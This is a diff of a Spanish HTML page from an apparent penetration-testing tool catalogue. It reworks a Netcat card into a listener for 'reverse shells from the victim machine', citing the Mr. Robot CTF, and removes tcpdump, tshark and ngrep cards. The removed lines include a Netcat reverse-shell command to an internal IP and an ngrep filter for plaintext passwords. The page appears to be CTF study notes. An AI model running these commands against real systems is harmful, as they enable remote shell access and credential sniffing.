@@ -79,74 +79,21 @@
         <h1>Escucha y Captura</h1>
         <span class="back-link"><a href="index.html">← Volver al catálogo</a></span>
       </div>
-      <p style="color:#4a75a0;font-size:1rem;margin-top:4px;">Netcat, tcpdump, Wireshark, análisis de tráfico y escucha de puertos.</p>
+      <p style="color:#4a75a0;font-size:1rem;margin-top:4px;">Herramientas para establecer escuchas y recibir conexiones entrantes.</p>
     </section>
 
     <section class="fade-in delay-2">
 
       <!-- Netcat -->
       <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">🔗</span><h3>Netcat (nc)</h3><span class="badge">Multipropósito</span></div>
-        <p class="desc">Herramienta de red para escuchar puertos, transferir archivos y crear shells reversas.</p>
+        <div class="tool-name"><span class="tool-icon">🔗</span><h3>Netcat (nc)</h3><span class="badge">Reverse Shell</span></div>
+        <p class="desc">Listener para recibir shells reversas desde la máquina víctima.</p>
         <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> nc -lvnp 4444</span>
+          <span class="cmd"><span class="prompt">$</span> nc -lnvp 5555</span>
           <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
         </div>
         <div class="extra-commands">
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> nc -e /bin/sh 192.168.1.100 4444</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> nc 192.168.1.1 80 &lt; request.txt</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- tcpdump -->
-      <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">📦</span><h3>tcpdump</h3><span class="badge">CLI</span></div>
-        <p class="desc">Capturador de paquetes por línea de comandos para análisis de tráfico.</p>
-        <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> tcpdump -i eth0 -w captura.pcap</span>
-          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-        </div>
-        <div class="extra-commands">
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> tcpdump -i eth0 port 80 -A</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> tcpdump -r captura.pcap</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Wireshark (CLI: tshark) -->
-      <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">🐟</span><h3>Wireshark / tshark</h3><span class="badge">GUI / CLI</span></div>
-        <p class="desc">Analizador de protocolos con interfaz gráfica y línea de comandos.</p>
-        <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> tshark -i eth0 -Y "http.request.method == GET"</span>
-          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-        </div>
-        <div class="extra-commands">
-          <div class="command-block">
-            <span class="cmd"><span class="prompt">$</span> tshark -r captura.pcap -T fields -e ip.src -e ip.dst</span>
-            <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
-          </div>
-        </div>
-      </div>
-
-      <!-- ngrep -->
-      <div class="tool-card">
-        <div class="tool-name"><span class="tool-icon">🔍</span><h3>ngrep</h3><span class="badge">Filtro</span></div>
-        <p class="desc">Grep para paquetes de red, busca patrones en el tráfico.</p>
-        <div class="command-block">
-          <span class="cmd"><span class="prompt">$</span> ngrep -i "password" -W byline port 80</span>
-          <button class="copy-btn" onclick="copyCommand(this)">Copiar</button>
+          <p style="color:#4a75a0;font-size:0.85rem;margin:6px 0 0 0;">Utilizado en el CTF Mr. Robot para recibir la reverse shell desde WordPress.</p>
         </div>
       </div>
 
